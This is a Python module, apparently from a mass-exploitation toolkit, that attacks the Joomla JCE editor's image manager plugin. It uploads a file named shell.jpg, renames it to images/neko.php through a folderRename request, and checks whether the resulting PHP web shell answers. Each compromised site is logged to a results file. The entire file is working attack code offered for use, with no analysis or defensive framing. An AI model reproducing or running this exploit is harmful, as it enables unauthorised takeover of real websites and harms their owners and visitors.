# coding=utf-8
import requests
from Exploits import printModule

Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
_shell = 'files/shell.jpg'


def Exploit(site):
    try:
        fileShell = {'Filedata': open(_shell, 'rb')}
        post_data = {'upload-dir': '/', 'upload-overwrite': '0', 'action': 'upload'}
        Exp = 'http://' + site + \
              '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form'
        Post = requests.post(Exp, files=fileShell, data=post_data, timeout=10, headers=Headers)
        OtherMethod = '"text":"' + _shell.split('/')[1] + '"'
        if OtherMethod in str(Post.content):
            PrivMethod = {'json': "{\"fn\":\"folderRename\",\"args\":[\"/" + _shell.split('/')[1]
                                  + "\",\"./../../images/neko.php\"]}"}
            try:
                privExploit = 'http://' + site + '/index.php?option=com_jce&task=' \
                                                 'plugin&plugin=imgmanager&file=imgmanager&version=156&format=raw'
                requests.post(privExploit, data=PrivMethod, timeout=10, headers=Headers)
                try:
                    nekoCheck = requests.get('http://' + site + '/images/neko.php', timeout=10, headers=Headers)
                    if 'neko!!' in str(nekoCheck.content):
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/images/neko.php' + '\n')
                        return printModule.returnYes(site, 'N/A', 'Com_JCE Shell', 'Joomla')
                    else:
                        return printModule.returnNo(site, 'N/A', 'Com_JCE Shell', 'Joomla')
                except:
                    return printModule.returnNo(site, 'N/A', 'Com_JCE Shell', 'Joomla')
            except:
                return printModule.returnNo(site, 'N/A', 'Com_JCE Shell', 'Joomla')
        else:
            return printModule.returnNo(site, 'N/A', 'Com_JCE Shell', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_JCE Shell', 'Joomla')
